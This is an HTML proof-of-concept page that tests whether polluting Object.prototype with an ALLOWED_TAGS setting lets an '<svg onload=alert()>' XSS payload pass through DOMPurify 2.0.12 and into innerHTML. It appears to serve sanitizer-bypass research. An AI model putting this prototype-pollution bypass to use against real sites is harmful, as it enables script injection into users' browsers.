<!doctype html><meta charset=utf-8>
<div id=sanitized></div>
<div id=sanitizedtext></div>
<script>

    Object = new Proxy(Object, {
        get: function(target, prop, receiver) {
            console.log('Access', prop);
            return target[prop];
        }
    });

    window.onload = function() {
        const html = '<svg onload=alert()>';
        //const html = '<svg>';
        const json = { ALLOWED_TAGS: ['svg'] };
        //const json = { };

        for (let [k, v] of Object.entries(json)) {
            Object.prototype[k] = v;
        }

        const sanitized = DOMPurify.sanitize(html);
        console.log(sanitized);
        window.sanitized.innerHTML = sanitized;
        window.sanitizedtext.innerText = sanitized;
    }

</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.js"></script>
